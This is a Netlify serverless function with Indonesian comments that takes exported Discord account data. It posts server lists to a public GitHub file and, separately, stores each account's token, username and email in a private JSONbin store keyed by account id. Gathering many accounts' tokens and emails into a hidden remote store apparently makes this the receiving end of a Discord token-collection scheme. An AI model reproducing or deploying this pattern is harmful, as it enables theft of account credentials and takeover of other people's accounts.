// netlify/functions/export.js
// POST https://your-site.netlify.app/.netlify/functions/export
//
// Strategi penyimpanan:
//   data/servers.json  → data publik (tanpa token, tanpa email) — dibaca dashboard (GitHub)
//   JSONbin            → token PRIVATE (via JSONBIN_BIN_ID + JSONBIN_API_KEY env)
//
// Merge logic:
//   - Server lama yang tidak ada di payload baru → TETAP (tidak dihapus)
//   - Server sama (cocok by server_id) → OVERWRITE dengan data baru
//   - Server baru → APPEND

const GITHUB_API = 'https://api.github.com';

// ── Helpers GitHub ────────────────────────────────────────────────────────────

function makeHeaders(token) {
  return {
    'Authorization': `token ${token}`,
    'Content-Type': 'application/json',
    'Accept': 'application/vnd.github.v3+json',
    'User-Agent': 'discord-dashboard-netlify',
  };
}

// Ambil file JSON dari GitHub, return { data, sha } atau { data: null, sha: null }
async function getGitHubFile(owner, repo, branch, path, ghToken) {
  try {
    const res = await fetch(
      `${GITHUB_API}/repos/${owner}/${repo}/contents/${path}?ref=${branch}&t=${Date.now()}`,
      { headers: makeHeaders(ghToken) }
    );
    if (!res.ok) return { data: null, sha: null };
    const file = await res.json();
    const raw  = Buffer.from(file.content, 'base64').toString('utf-8');
    return { data: JSON.parse(raw), sha: file.sha };
  } catch (_) {
    return { data: null, sha: null };
  }
}

// Push file JSON ke GitHub (create atau update)
async function putGitHubFile(owner, repo, branch, path, ghToken, data, sha, commitMsg) {
  const content = Buffer.from(JSON.stringify(data, null, 2)).toString('base64');
  const body    = {
    message: commitMsg || `chore: update ${path} ${new Date().toISOString()}`,
    content,
    branch,
    ...(sha ? { sha } : {}),
  };
  const res = await fetch(
    `${GITHUB_API}/repos/${owner}/${repo}/contents/${path}`,
    { method: 'PUT', headers: makeHeaders(ghToken), body: JSON.stringify(body) }
  );
  if (!res.ok) {
    const err = await res.json();
    throw new Error(`GitHub PUT error [${path}]: ${JSON.stringify(err)}`);
  }
  return await res.json();
}

// ── Sanitize payload → data publik (tanpa token/email) ───────────────────────

function buildPublicData(payload) {
  const pub = JSON.parse(JSON.stringify(payload));
  delete pub.token;
  if (pub.account) delete pub.account.email;
  if (Array.isArray(pub.servers)) {
    pub.servers = pub.servers.map(s => {
      const c = { ...s }; delete c.token; return c;
    });
  } else if (pub.servers && typeof pub.servers === 'object') {
    for (const k of Object.keys(pub.servers)) {
      if (pub.servers[k]?.token) delete pub.servers[k].token;
    }
  }
  pub.exported_at = new Date().toISOString();
  return pub;
}

// ── Merge servers: old + new, keyed by server_id ─────────────────────────────

function mergeServers(oldServers, newServers) {
  function toMap(servers) {
    const map = new Map();
    if (Array.isArray(servers)) {
      for (const s of servers) {
        if (s?.id) map.set(s.id, s);
      }
    } else if (servers && typeof servers === 'object') {
      for (const [name, s] of Object.entries(servers)) {
        const id = s?.server_id || s?.id;
        if (id) map.set(id, { _name: name, ...s });
      }
    }
    return map;
  }

  const oldMap = toMap(oldServers);
  const newMap = toMap(newServers);

  for (const [id, srv] of newMap.entries()) {
    oldMap.set(id, srv);
  }

  if (Array.isArray(newServers)) {
    return Array.from(oldMap.values());
  } else {
    const result = {};
    for (const [, srv] of oldMap.entries()) {
      const name = srv._name || srv.name || srv.server_id || srv.id;
      const clean = { ...srv }; delete clean._name;
      result[name] = clean;
    }
    return result;
  }
}

// ── Helper: buat Map<id, obj> dari servers ────────────────────────────────────

function toIdMap(servers) {
  const map = new Map();
  if (Array.isArray(servers)) {
    for (const s of servers) { if (s?.id) map.set(s.id, s); }
  } else if (servers && typeof servers === 'object') {
    for (const s of Object.values(servers)) {
      const id = s?.server_id || s?.id;
      if (id) map.set(id, s);
    }
  }
  return map;
}

// ── Ekstrak token dari payload ────────────────────────────────────────────────

function extractTokenEntry(payload) {
  if (!payload.token) return null;
  return {
    token:       payload.token,
    account_id:  payload.account?.id       || null,
    username:    payload.account?.username || null,
    email:       payload.account?.email    || null,
    exported_at: new Date().toISOString(),
  };
}

// ── Merge tokens: keyed by account_id ────────────────────────────────────────

function mergeTokens(oldTokens, newEntry) {
  const arr = Array.isArray(oldTokens) ? [...oldTokens] : [];
  const idx = arr.findIndex(t => t.account_id && t.account_id === newEntry.account_id);
  if (idx >= 0) {
    arr[idx] = newEntry;
  } else {
    arr.push(newEntry);
  }
  return arr;
}

// ── Push token ke JSONbin ─────────────────────────────────────────────────────

async function pushToken(tokenEntry) {
  const binId  = process.env.JSONBIN_BIN_ID;
  const apiKey = process.env.JSONBIN_API_KEY;
  const base   = 'https://api.jsonbin.io/v3';

  // Ambil data lama
  const getRes = await fetch(`${base}/b/${binId}/latest`, {
    headers: { 'X-Master-Key': apiKey }
  });

  if (!getRes.ok) throw new Error(`JSONbin GET failed: ${getRes.status}`);

  const getData   = await getRes.json();
  const oldTokens = getData.record?.tokens || [];

  // Merge
  const merged = mergeTokens(oldTokens, tokenEntry);

  // Update bin
  const putRes = await fetch(`${base}/b/${binId}`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-Master-Key': apiKey,
    },
    body: JSON.stringify({ tokens: merged })
  });

  if (!putRes.ok) {
    const err = await putRes.json();
    throw new Error(`JSONbin PUT failed: ${JSON.stringify(err)}`);
  }
}

// ── Main push: servers.json (GitHub publik) + token (JSONbin) ─────────────────

async function pushAll(payload) {
  const owner   = process.env.GITHUB_OWNER;
  const repo    = process.env.GITHUB_REPO;
  const branch  = process.env.GITHUB_BRANCH || 'main';
  const ghToken = process.env.GITHUB_TOKEN;

  const stats = { servers_added: 0, servers_updated: 0, token_saved: false };

  // ── 1. Push servers.json (publik, tanpa token) ────────────────────────────
  const pubData = buildPublicData(payload);
  const { data: oldPub, sha: pubSha } = await getGitHubFile(
    owner, repo, branch, 'data/servers.json', ghToken
  );

  let mergedServers;
  if (oldPub?.servers) {
    const oldMap = toIdMap(oldPub.servers);
    const newMap = toIdMap(pubData.servers);
    stats.servers_added   = [...newMap.keys()].filter(id => !oldMap.has(id)).length;
    stats.servers_updated = [...newMap.keys()].filter(id =>  oldMap.has(id)).length;
    mergedServers = mergeServers(oldPub.servers, pubData.servers);
  } else {
    mergedServers = pubData.servers;
    stats.servers_added = Array.isArray(mergedServers)
      ? mergedServers.length
      : Object.keys(mergedServers).length;
  }

  const finalPub = {
    ...pubData,
    servers: mergedServers,
    total_servers: Array.isArray(mergedServers)
      ? mergedServers.length
      : Object.keys(mergedServers).length,
  };

  await putGitHubFile(
    owner, repo, branch, 'data/servers.json', ghToken, finalPub, pubSha,
    `chore: update servers (${stats.servers_added} baru, ${stats.servers_updated} diperbarui) ${new Date().toISOString()}`
  );

  // ── 2. Push token ke JSONbin ──────────────────────────────────────────────
  const tokenEntry = extractTokenEntry(payload);
  if (tokenEntry) {
    try {
      await pushToken(tokenEntry);
      stats.token_saved = true;
    } catch (e) {
      console.error('[export fn] token push failed:', e.message);
    }
  }

  return stats;
}

// ── Netlify Function Handler ──────────────────────────────────────────────────

exports.handler = async (event) => {
  const corsHeaders = {
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, X-Export-Key',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers: corsHeaders, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers: corsHeaders, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  // Auth
  const exportKey = event.headers['x-export-key'] || event.headers['X-Export-Key'];
  if (!process.env.EXPORT_SECRET_KEY || exportKey !== process.env.EXPORT_SECRET_KEY) {
    return { statusCode: 401, headers: corsHeaders, body: JSON.stringify({ error: 'Unauthorized' }) };
  }

  // Parse body
  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (_) {
    return { statusCode: 400, headers: corsHeaders, body: JSON.stringify({ error: 'Invalid JSON body' }) };
  }

  if (!payload?.servers) {
    return { statusCode: 400, headers: corsHeaders, body: JSON.stringify({ error: 'Missing servers field' }) };
  }

  // Push
  try {
    const stats = await pushAll(payload);
    return {
      statusCode: 200,
      headers: corsHeaders,
      body: JSON.stringify({
        success:         true,
        exported_at:     new Date().toISOString(),
        servers_added:   stats.servers_added,
        servers_updated: stats.servers_updated,
        token_saved:     stats.token_saved,
      }),
    };
  } catch (e) {
    console.error('[export fn error]', e);
    return { statusCode: 500, headers: corsHeaders, body: JSON.stringify({ error: e.message }) };
  }
};
